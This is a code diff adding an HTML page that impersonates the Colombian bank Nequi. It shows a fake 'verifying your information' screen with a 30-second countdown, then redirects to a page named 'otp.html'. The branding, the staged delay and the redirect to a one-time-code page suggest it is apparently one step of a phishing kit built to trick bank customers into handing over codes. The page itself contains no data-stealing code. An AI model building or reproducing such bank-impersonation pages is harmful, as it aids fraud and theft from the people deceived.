@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi | Cargando...</title>
+    <link rel="shortcut icon" href="./assets/pse/N_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/nequ.css">
+</head>
+<body class="bg-[#fbe5f2] bg-nequi min-h-screen flex items-center justify-center">
+    <div class="text-center">
+        <img src="./assets/pse/loading_nequi.gif" width="200px" class="mx-auto mb-8">
+        <h2 class="text-2xl font-bold text-[#200020] mb-4">Verificando tu información</h2>
+        <p class="text-[#200020] mb-6">Esto puede tomar hasta 30 segundos</p>
+        <div class="w-64 bg-gray-200 rounded-full h-2 mx-auto">
+            <div id="progress-bar" class="bg-[#DA0081] h-2 rounded-full transition-all duration-1000" style="width: 0%"></div>
+        </div>
+        <p id="countdown" class="text-[#DA0081] font-semibold mt-4">30</p>
+    </div>
+
+    <script>
+        let timeLeft = 30;
+        const progressBar = document.getElementById('progress-bar');
+        const countdown = document.getElementById('countdown');
+        
+        const timer = setInterval(() => {
+            timeLeft--;
+            const progress = ((30 - timeLeft) / 30) * 100;
+            progressBar.style.width = progress + '%';
+            countdown.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                window.location.href = 'otp.html';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
